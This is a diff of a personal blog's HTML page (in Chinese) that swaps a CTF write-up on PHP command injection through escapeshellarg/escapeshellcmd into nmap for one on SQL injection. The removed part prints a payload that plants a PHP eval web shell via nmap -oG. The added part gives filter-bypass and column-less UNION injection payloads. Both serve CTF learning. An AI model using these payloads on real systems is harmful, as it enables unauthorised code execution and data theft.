@@ -9,7 +9,7 @@
     
     <title>
         
-            OnlineTool |
+            SWPU2019-WEB1 |
         
         paixiaoxing&#39;s Blog
     </title>
@@ -150,7 +150,7 @@
     <div class="article-content-container">
 
         <div class="article-title">
-            <span class="title-hover-animation">OnlineTool</span>
+            <span class="title-hover-animation">SWPU2019-WEB1</span>
         </div>
 
         
@@ -169,10 +169,21 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fas fa-edit"></i>&nbsp;
-        <span class="pc">2022-03-03 16:17:52</span>
-        <span class="mobile">2022-03-03 16:17</span>
+        <span class="pc">2022-03-06 20:09:54</span>
+        <span class="mobile">2022-03-06 20:09</span>
     </span>
     
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/SWPU2019/">SWPU2019</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
     
 
     
@@ -191,36 +202,52 @@
         
 
         <div class="article-content markdown-body">
-            <h1 id="OnlineTool"><a href="#OnlineTool" class="headerlink" title="OnlineTool"></a>OnlineTool</h1><p>昨天的朱雀杯提到了这个，想了一下自己好像没写wp，今天补一下</p>
-<p>源码：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;host&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host = $_GET[&#x27;host&#x27;];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    echo &#x27;you are in sandbox &#x27;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+            <h1 id="SWPY2019-WEB-1"><a href="#SWPY2019-WEB-1" class="headerlink" title="[SWPY2019]WEB 1"></a>[SWPY2019]WEB 1</h1><p>也算是通过题目学sql注入了</p>
+<p>进入题目</p>
+<p>发现是一个登录框，一直测了很久，发现还是得注册进去</p>
+<p>似乎是没啥漏洞</p>
+<p>进去发现，是一个广告申请系统</p>
+<p>我们可以进行申请广告并进去查看</p>
+<p>看了一下，好像漏洞出现再这个申请广告的地方，得先随便上传一些东西看看是啥样</p>
+<p><img src="/2022/03/06/SWPU2019-WEB1/3.png" alt="1"></p>
+<p>看到我们写入的标题以及内容都显示在页面上，还可以进去查看内容</p>
+<p>稍微测试了一下看看是xss还是sql</p>
+<p>最终发现还是sql，在外面她会给你看你原来输入的东西，但是点进去之后</p>
+<p>会执行sql语句</p>
+<p>而且是单引号闭合，但是%27 还有#都被过滤了，没办法注释后面的内容</p>
+<p>又写入一些数据测试一下发现</p>
+<p>当我们输入两个<code>1&#39;123</code>时会返回‘123’报错，也就是说我们可以再构造一个单引号使得单引号，输入联合查询函数就可以运行我们的查询语句</p>
+<p>运行联合查询的时候发现又过滤了<code>/**/</code>因为一半这个都能过，我就测试了一下，是可以的然后一直联合查询，但是数据一直不对，最后看到队列长度是22</p>
+<p><img src="/2022/03/06/SWPU2019-WEB1/1.png" alt="1"></p>
+<p>点进去一看</p>
+<p><img src="/2022/03/06/SWPU2019-WEB1/2.png" alt="1"></p>
+<p>在2，3处回显了</p>
+<p>也就是说我们需要在这里面构造我们的查询语句</p>
+<p>但是在查询的时候发现information_schema被过滤了，去网上查了一下找了两种方法bypass</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br><span class="line">sys.schema_auto_increment_columns</span><br></pre></td></tr></table></figure>
 
-<p>可以看到需要我们提供一个host，host会经过两层过滤</p>
-<p>一层是<code>escapeshellarg</code>另一层是<code>escapeshellcmd</code>,escapeshellarg命令的含义是将给字符串增加一对单引号并且能引用或者转码任何已经存在的单引号,他要正常执行还需要在这中间包裹其中的符号来执行</p>
-<p>比如说：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &#x27; -s -v a=1</span><br><span class="line">进行过滤之后就会变成</span><br><span class="line">&#x27;127.0.0.1&#x27;\&#x27;&#x27; -s -v a=1&#x27;</span><br></pre></td></tr></table></figure>
+<p>可以构造</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats</span><br></pre></td></tr></table></figure>
 
-<p>而<code>escapeshellcmd</code>命令的含义是对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp; # ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] &#123; &#125; $\ \x0A \xFF</span><br><span class="line">’和&quot;仅在不配对的时候会进行转义</span><br></pre></td></tr></table></figure>
+<p>查询到我们需要使用的表</p>
+<p>接下来的列怎么办，没办法知道他的列名：</p>
+<p>实在没办法查询了一下大佬们的wp</p>
+<p>发现需要用无列名查询</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参考：</span><br><span class="line"></span><br><span class="line">https://www.jianshu.com/p/dc9af4ca2d06</span><br><span class="line"></span><br><span class="line">https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/</span><br></pre></td></tr></table></figure>
 
-<p>这本来是没有什么问题的，但是搭配起来就会出现问题：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">比如说上面的escapeshellarg过滤之后的字符再进行escapeshellcmd过滤：</span><br><span class="line">也就是说上面的会变成</span><br><span class="line">&#x27;127.0.0.1&#x27;\\&#x27;&#x27; -s -v a=1&#x27;</span><br><span class="line">这样就把上面的语句分成了三个部分：</span><br><span class="line">127.0.0.1    &#x27;空&#x27;   以及一个post方式传入的a=1&#x27;</span><br></pre></td></tr></table></figure>
 
-<p>比如我们写一个:</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;</span><br><span class="line">经过escapeshellarg之后变成</span><br><span class="line">&#x27;1&#x27;\&#x27;&#x27;&#x27;</span><br><span class="line">在经过escapeshellcmd之后会变成(她会转义单独的引号还有其他的符号)</span><br><span class="line">也就是\和最后的’会被转义</span><br><span class="line">变成：</span><br><span class="line">&#x27;1&#x27;\\&#x27;&#x27;\&#x27;</span><br><span class="line">为了方便观看写到一起：</span><br><span class="line">&#x27;1&#x27;\&#x27;&#x27;&#x27;</span><br><span class="line">&#x27;1&#x27;\\&#x27;&#x27;\&#x27;</span><br></pre></td></tr></table></figure>
 
-<p>将他放到题目中去：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot; . &#x27;1&#x27;\\&#x27;&#x27;\&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查询全部列名的一般方法：</span><br><span class="line">select * from users</span><br><span class="line"></span><br><span class="line">假设有6列</span><br><span class="line">select 1,2,3,4,5,6 union select * from users</span><br><span class="line"></span><br><span class="line">列名就会以数字标号,因为是*所以他会以1-6来排序</span><br><span class="line"></span><br><span class="line">如果需要提取其中某一列，可以用反引号标注出列号(最后需要添加任意字符串ps:不知道为啥)</span><br><span class="line"></span><br><span class="line">假设我们需要查询第四列的数据我们就可以输入</span><br><span class="line">select `4` from （select 1，2，3，4，5，6 union select * from users)a</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">\\会被解析成一个\两个连续的单引号会被解析成一个空白</span><br><span class="line">如果我们输入的是</span><br><span class="line">1&#x27;命令&#x27;</span><br><span class="line">那么就会变成</span><br><span class="line">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F&quot; . &#x27;127.0.0.1&#x27;\\&#x27;&#x27; 命令 &#x27;\\&#x27;&#x27;&#x27;</span><br><span class="line">也就是</span><br><span class="line">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F&quot; . &#x27;127.0.0.1&#x27; 命令 \</span><br><span class="line">我们输入的命令就会被nmap解析成条件，我们就可以写入一个nmap写文件参数执行。</span><br></pre></td></tr></table></figure>
+<p>但是这一题反引号被过滤了</p>
+<p>所以我们需要找别的方法，发现as可以替代反引号的功效</p>
+<p>上面的方法可以改成</p>
+<p><code>select a fron (select 1,2,3,4 as a,5,6 union select * fron users)a</code></p>
+<p>最后我们直接构造payload：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure>
 
-<p>附上nmap的利用参数：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">选项 解释</span><br><span class="line">-oN 标准保存</span><br><span class="line">-oX XML保存</span><br><span class="line">-oG Grep保存</span><br><span class="line">-oA 保存到所有格式</span><br><span class="line">-append-output 补充保存文件</span><br></pre></td></tr></table></figure>
-
-<p>最终payload：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; &lt;?php eval($_POST[&quot;a&quot;]); ?&gt; -oG hack.php &#x27;</span><br></pre></td></tr></table></figure>
-
-<p>然后访问hack.php命令执行就行了</p>
+<p><img src="/2022/03/06/SWPU2019-WEB1/7.PNG" alt="1"></p>
+<p>拿到flag</p>
 
         </div>
 
@@ -228,11 +255,11 @@
             <div class="post-copyright-info">
                 <div class="article-copyright-info-container">
     <ul>
-        <li>Post title：OnlineTool</li>
+        <li>Post title：SWPU2019-WEB1</li>
         <li>Post author：paixiaoxing</li>
-        <li>Create time：2022-03-03 16:17:52</li>
+        <li>Create time：2022-03-06 20:09:54</li>
         <li>
-            Post link：https://keep.xpoet.cn/2022/03/03/OnlineTool/
+            Post link：https://keep.xpoet.cn/2022/03/06/SWPU2019-WEB1/
         </li>
         <li>
             Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
@@ -244,33 +271,26 @@
         
 
         
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/SWPU2019/">#SWPU2019</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
 
         
             <div class="article-nav">
-                
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2022/03/06/SWPU2019-WEB1/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">SWPU2019-WEB1</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
                 
                 
                     <div class="article-next">
                         <a class="next"
                            rel="next"
-                           href="/2022/03/02/%E6%9C%B1%E9%9B%80%E6%9D%AF-Nmap/"
+                           href="/2022/03/03/OnlineTool/"
                         >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">网鼎杯-朱雀组-Nmap</span>
+                                <span class="post-nav-title-item">OnlineTool</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex-center">
@@ -396,7 +416,7 @@
         <aside class="page-aside">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#OnlineTool"><span class="nav-number">1.</span> <span class="nav-text">OnlineTool</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SWPY2019-WEB-1"><span class="nav-number">1.</span> <span class="nav-text">[SWPY2019]WEB 1</span></a></li></ol>
     </div>
 </div>
         </aside>
